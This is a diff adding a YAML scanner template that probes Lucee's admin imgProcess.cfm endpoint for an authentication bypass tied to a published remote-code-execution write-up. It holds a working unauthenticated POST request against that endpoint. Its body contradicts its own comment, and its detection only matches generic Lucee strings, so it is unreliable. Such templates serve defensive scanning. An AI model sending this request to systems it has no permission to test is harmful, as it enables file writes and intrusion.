@@ -1,0 +1,26 @@
+id: coldfusion-lucee-auth-bypass
+info:
+  name: Adobe ColdFusion Lucee Auth Bypass
+  risk: High
+
+params:
+  - root: "{{.BaseURL}}"
+
+requests:
+  - method: POST
+    redirect: false
+    url: >-
+      {{.root}}/lucee/admin/imgProcess.cfm?file=filename.cfm
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+      - Content-Type: application/x-www-form-urlencoded
+    # NOTE real body is: imgSrc=sample
+    body: |
+      imgSrcsss="#stText.Buttons.save#"
+    detections:
+      - >-
+        StringSearch('body', '-lucee-icon') && StringSearch('body', 'Lucee')
+
+reference:
+  - links:
+      - https://github.com/httpvoid/writeups/blob/main/Apple-RCE.md
